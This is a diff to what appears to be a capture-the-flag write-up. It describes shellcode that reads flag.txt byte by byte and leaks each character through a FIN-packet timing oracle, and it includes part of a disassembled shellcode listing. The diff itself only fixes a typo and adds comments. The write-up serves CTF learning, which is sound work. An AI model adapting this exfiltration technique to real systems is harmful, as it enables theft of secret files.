@@ -341,8 +341,8 @@ So we came up with the following tactics:
 - Receive the introduction packets with the File Descriptor (which is always 5 for the server)
 - Send shellcode data
 - The shellcode would read one character at a time from the open File Descriptor, using the `read` syscall and wait for a single character from the client
-- The shellcode would them compare the character read from `flag.txt` to the one received from the client. If they are the same, terminate the process, if not, wait for the next character from the client
-- The client would be checking if FIN was received from the server. If FIN is received, the client stops and the last character sent is (usually) the flag's character.
+- The shellcode would then compare the character read from the `flag.txt` file to the one received from the client. If they are the same, terminate the process (thus, sending a FIN packet to the client), if not, wait for the next character from the client
+- The client would be checking if FIN was received from the server.  If FIN is received, the client stops and the last character sent is (usually) the flag's character.
 - Continue doing this until all flag.txt characters are discovered.
   
   
@@ -362,7 +362,7 @@ a:  48 c7 c7 05 00 00 00    mov    rdi,0x5                  # <<< FD of flag.txt
 11: 48 89 e6                mov    rsi,rsp
 14: 48 c7 c2 01 00 00 00    mov    rdx,0x1
 1b: 48 c7 c0 00 00 00 00    mov    rax,0x0
-22: 0f 05                   syscall
+22: 0f 05                   syscall                         # read syscall
 24: 90                      nop
 25: 49 ff c8                dec    r8
 28: 75 e0                   jne    a <aaa>
@@ -373,7 +373,7 @@ a:  48 c7 c7 05 00 00 00    mov    rdi,0x5                  # <<< FD of flag.txt
 35: 48 ff c6                inc    rsi
 38: 48 c7 c2 01 00 00 00    mov    rdx,0x1
 3f: 48 c7 c0 00 00 00 00    mov    rax,0x0
-46: 0f 05                   syscall
+46: 0f 05                   syscall                         # read syscall
 48: 90                      nop
 49: 8a 04 24                mov    al,BYTE PTR [rsp]
 4c: 8a 54 24 01             mov    dl,BYTE PTR [rsp+0x1]
